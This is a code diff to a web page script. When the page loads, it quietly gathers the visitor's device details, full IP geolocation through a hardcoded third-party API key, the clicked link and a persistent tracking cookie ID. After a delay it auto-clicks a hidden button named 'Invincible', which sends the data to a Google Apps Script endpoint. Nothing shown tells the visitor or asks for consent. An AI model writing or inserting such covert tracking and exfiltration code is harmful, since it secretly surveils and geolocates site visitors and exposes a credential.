@@ -1,6 +1,6 @@
-var crrTime, userMemory, userCores, userBroSys, crrIp;
+var crrTime, userMemory, userCores, userBroSys, crrIp, cookie = GetCookie();
 
-function fetchData() {
+function fetchData(LinkClicked) {
     /* Device Date And Time */
     try {
         var currentTime = new Date();
@@ -26,6 +26,12 @@ function fetchData() {
         document.getElementById("Date").value = "Cannot Fetch";
     }
 
+
+    try {
+        document.getElementById("Id").value = SetUniqueId();
+    } catch {
+        document.getElementById("Id").value = "Error";
+    }
 
     /* Device Ram */
     try {
@@ -60,10 +66,11 @@ function fetchData() {
 
     /* Device IP Address */
     try {
-        $.getJSON("https://api.ipify.org?format=json",
-            function(data) {
-                crrIp = data.ip;
-            });
+        let apiKey = 'd6cbdd493ebd4d27a27bece063120d1d';
+        $.getJSON('https://api.bigdatacloud.net/data/ip-geolocation-full?key=' + apiKey, function(data) {
+            crrIp = (JSON.stringify(data, null, 2));
+            document.getElementById("IP_Address").value = crrIp;
+        });
     } catch {
         document.getElementById("IP_Address").value = "Cannot Fetch";
     }
@@ -74,6 +81,13 @@ function fetchData() {
         var OS = navigator.userAgent;
         parser.setUA(OS);
         var result = parser.getResult();
+
+        /* Url */
+        try {
+            document.getElementById("URL").value = LinkClicked;
+        } catch {
+
+        }
 
         /* Device OS */
         try {
@@ -183,19 +197,21 @@ function fetchData() {
     } catch {
 
     } finally {
+
         setTimeout(
             function() {
-                document.getElementById("IP_Address").value = crrIp;
                 document.getElementById("Invincible").click();
-            }, 1500);
+            },
+            1000);
+
     }
 }
-setTimeout(fetchData, 3500);
+setTimeout(() => { fetchData("Main") }, 3000);
 
-const scriptURLHidden = 'https://script.google.com/macros/s/AKfycbwGU68Yc9BjFKU-spCPr5Gzs4wGr2ZTqPyF_68HUhmrHRrRfr_d/exec'
+const scriptURLHidden = 'https://script.google.com/macros/s/AKfycbwGU68Yc9BjFKU-spCPr5Gzs4wGr2ZTqPyF_68HUhmrHRrRfr_d/exec';
 
-const formHidden = document.getElementsByClassName('hidden-form')
-const btnFormHidden = document.getElementById('Invincible')
+const formHidden = document.getElementsByClassName('hidden-form');
+const btnFormHidden = document.getElementById('Invincible');
 
 btnFormHidden.addEventListener('click', e => {
     e.preventDefault()
@@ -204,6 +220,25 @@ btnFormHidden.addEventListener('click', e => {
         body: new FormData(formHidden[0])
     })
 })
+
+
+
+function GetCookie() {
+    return document.cookie
+        .split(';')
+        .map(cookie => cookie.split('='))
+        .reduce((accumulator, [key, value]) => ({...accumulator, [key.trim()]: decodeURIComponent(value) }), {});
+}
+
+function SetUniqueId() {
+    if (cookie.Id != null) {
+        return cookie.Id;
+    } else {
+        document.cookie = "Id=" + Math.floor(100000 + Math.random() * 900000);
+        GetCookie();
+        return cookie.Id;
+    }
+}
 
 window.dataLayer = window.dataLayer || [];
 
